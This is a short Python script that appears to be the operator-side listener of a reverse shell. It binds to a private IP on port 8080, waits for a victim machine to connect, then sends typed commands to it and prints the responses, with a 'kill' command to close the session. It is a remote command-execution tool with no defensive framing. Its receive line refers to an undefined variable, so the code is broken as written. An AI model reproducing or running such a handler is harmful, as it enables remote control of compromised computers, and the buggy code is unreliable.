import socket

def main():
    reciever = Reciever('192.168.159.132', 8080)
    reciever.start()

class Reciever:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        self.connect()
        self.shell()

    def connect(self):
        sock = socket.socket()
        sock.bind((self.ip, self.port))
        sock.listen(1)
        self.conn, self.addr = sock.accept()
        return print(f'[+] Connection recieved from {self.addr}')

    def shell(self):
        while True:
            command = input('>> ')
            if 'kill' in command:
                self.conn.send('kill'.encode())
                self.conn.close()
                return
            self.conn.send(command.encode())
            print(conn.recv(1024).decode())


if __name__ == '__main__':
    main()